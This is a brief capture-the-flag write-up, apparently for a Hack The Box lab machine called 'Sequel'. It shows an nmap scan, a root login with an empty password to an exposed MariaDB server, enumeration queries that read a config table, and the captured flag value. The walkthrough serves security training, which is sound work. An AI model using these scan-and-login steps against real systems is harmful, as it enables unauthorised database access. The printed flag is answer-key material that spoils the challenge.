
## CTF Writeup: Sequel

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.232
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 17:55 -0500
Nmap scan report for 10.129.95.232
Host is up (0.022s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Speaks41ProtocolOld, ODBCClient, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 6S}@dWh%yX-ry,iO1DA[
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.29 seconds
```

There is an active MySQL Database publicly accessible. 

Connected to it and gained MySQL Shell.

```
mysql -u root -p'' -h 10.129.95.232 -P 3306 --skip-ssl-verify-server-cert
```

Utilized the following queries:

```
show databases;
use htb;
show tables;
SELECT * FROM config;
```

Retrieved flag.txt.

```
7b4bec00d1a39e3dd4e021ec3d915da8
```